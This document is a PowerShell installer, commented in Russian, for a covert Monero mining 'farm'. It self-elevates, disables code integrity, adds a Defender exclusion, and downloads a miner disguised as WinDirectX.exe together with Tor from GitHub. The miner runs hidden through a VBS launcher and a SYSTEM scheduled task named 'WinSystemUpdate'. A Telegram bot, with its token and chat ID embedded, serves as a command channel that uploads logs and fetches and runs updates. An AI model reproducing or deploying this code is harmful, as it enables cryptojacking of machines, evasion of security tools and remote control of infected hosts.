# =========================================================
# ФИНАЛЬНЫЙ СКРИПТ УПРАВЛЕНИЯ ФЕРМОЙ (V10.0)
# =========================================================

# 1. ПРОВЕРКА АДМИНА
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# 2. ГЕНЕРАЦИЯ УНИКАЛЬНОГО ИМЕНИ (E-MAXPC-XX)
$rand = -join ((65..90) | Get-Random -Count 2 | % {[char]$_})
$pcName = "E-MAXPC-$rand"

# 3. КОНФИГУРАЦИЯ
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
$user = "Isfandiyor0112-star"
$tgToken = "8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE"
$chatId = "6881699459"

# СНИМАЕМ ЗАПРЕТЫ И ВКЛЮЧАЕМ TLS 1.2
Set-ExecutionPolicy Bypass -Scope Process -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 4. СОЗДАНИЕ ПАПКИ И ИСКЛЮЧЕНИЙ
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 5. ФУНКЦИИ В ПРОФИЛЕ (Для ручного управления на месте)
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$Functions = @"
function check {
    `$hashLine = Get-Content "$path\miner.log" -Tail 20 | Select-String "speed" | Select-Object -Last 1
    `$hash = if (`$hashLine) { `$hashLine.ToString().Split(' ')[-3] } else { "0" }
    `$temp = try { `$t = Get-CimInstance -Namespace root/wmi -ClassName MsAcpi_ThermalZoneTemperature; "[$([math]::Round(`$t.CurrentTemperature / 10 - 273.15, 1))°C]" } catch { "[N/A]" }
    Write-Host "--- СТАТУС $pcName ---" -ForegroundColor Cyan
    Write-Host "🚀 Speed: `$hash H/s | 🔥 Temp: `$temp" -ForegroundColor Green
}
function update { Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" }
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 6. КОМАНДЫ ДЛЯ ТЕЛЕГРАМ (БЛОК №9)
$ControlJob = {
    param($pcName, $tgToken, $chatId, $path, $user, $wallet)
    $lastUpdateId = 0
    while($true) {
        try {
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
            foreach ($upd in $updates.result) {
                $lastUpdateId = $upd.update_id
                $msg = $upd.message.text.ToLower()
                
                # --- CHECK ---
                if ($msg -eq "check" -or $msg -eq "check $pcName") {
                    $hashLine = Get-Content "$path\miner.log" -Tail 20 | Select-String "speed" | Select-Object -Last 1
                    $hash = if ($hashLine) { $hashLine.ToString().Split(' ')[-3] } else { "0" }
                    $cpu = (Get-CimInstance Win32_Processor).Name
                    $temp = try { $t = Get-CimInstance -Namespace root/wmi -ClassName MsAcpi_ThermalZoneTemperature -ErrorAction SilentlyContinue; "$([math]::Round($t.CurrentTemperature / 10 - 273.15, 1))°C" } catch { "N/A" }
                    $mem = Get-CimInstance Win32_OperatingSystem | % { "$([math]::Round(($_.TotalVisibleMemorySize - $_.FreePhysicalMemory) / 1MB, 1))GB / $([math]::Round($_.TotalVisibleMemorySize / 1MB, 1))GB" }
                    
                    $res = "📊 *ОТЧЕТ: $pcName*`n🚀 Speed: *$hash H/s*`n🔥 Temp: *$temp*`n🧠 RAM: *$mem*`n💻 CPU: $cpu"
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body @{chat_id=$chatId; text=$res; parse_mode="Markdown"}
                }

                # --- LOG ---
                if ($msg -eq "log $pcName" -or $msg -eq "log all") {
                    if (Test-Path "$path\miner.log") {
                        curl.exe -F "chat_id=$chatId" -F "document=@$path\miner.log" "https://api.telegram.org/bot$tgToken/sendDocument"
                    }
                }

                # --- DELETE (БЕЗОПАСНЫЙ) ---
                if ($msg -eq "delete $pcName" -or $msg -eq "delete all") {
                    Stop-Process -Name "WinDirectX", "tor", "taskhostw" -Force -ErrorAction SilentlyContinue
                    Remove-Item "$path\tor.exe" -Force -ErrorAction SilentlyContinue
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage?chat_id=$chatId&text=⚠️ [$pcName]: TOR УДАЛЕН. МАЙНЕР СТОП."
                }

                # --- UPDATE ---
                if ($msg -eq "update $pcName" -or $msg -eq "update all") {
                    Stop-Process -Name "WinDirectX", "tor", "taskhostw" -Force -ErrorAction SilentlyContinue
                    Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe"
                    Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe"
                    Start-Process -FilePath "$path\win_start.vbs"
                }
            }
        } catch {}
        Start-Sleep -Seconds 5
    }
}
Start-Job -ScriptBlock $ControlJob -ArgumentList $pcName, $tgToken, $chatId, $path, $user, $wallet

# 7. ФОРМИРОВАНИЕ ЗАПУСКА
$cmd = "@echo off`ntimeout /t 15 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $pcName --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set W = CreateObject(`"WScript.Shell`")`nW.Run `"$path\tor.exe`", 0, False`nW.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 8. ПЛАНИРОВЩИК (ОТ ИМЕНИ SYSTEM)
$TaskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$path\win_start.vbs`""
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WinSystemUpdate" -Action $TaskAction -Trigger $TaskTrigger -User "SYSTEM" -RunLevel Highest -Force

# 9. СТАРТ
powercfg /x -hibernate-timeout-ac 0
powercfg /x -monitor-timeout-ac 5
powercfg /x -standby-timeout-ac 0
Start-Process -FilePath "$path\win_start.vbs"
Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage?chat_id=$chatId&text=🚀 [$pcName]: СИСТЕМА ОНЛАЙН!"
Write-Host "--- УСТАНОВКА ЗАВЕРШЕНА: $pcName ---" -ForegroundColor Magenta
